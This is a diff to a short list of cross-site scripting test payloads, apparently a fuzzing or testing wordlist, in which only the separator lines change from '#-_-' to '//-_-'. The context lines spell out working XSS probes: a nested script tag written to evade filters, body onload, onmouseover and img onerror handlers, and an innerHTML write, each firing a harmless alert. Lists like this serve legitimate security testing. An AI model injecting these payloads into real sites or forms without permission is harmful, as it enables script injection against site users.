@@ -1,16 +1,16 @@
-#-_-
+//-_-
 <scr<script>ipt>alert('JOPA')</scr<>ipt>
-#-_-
+//-_-
 <body onload="alert('JOPA')">
-#-_-
+//-_-
 <b onmouseover=alert('JOPA')>Click Me!</b>
-#-_-
+//-_-
 <img src="x" onerror="alert('JOPA')">
-#-_-
+//-_-
 <script>
   function myFunction() {
   document.getElementsByClassName(textarea).innerHTML = "JOPA";
   }
   </script>
- #-_-
+//-_-
 <div><img src="" onerror="alert('JOPA')"/></div>
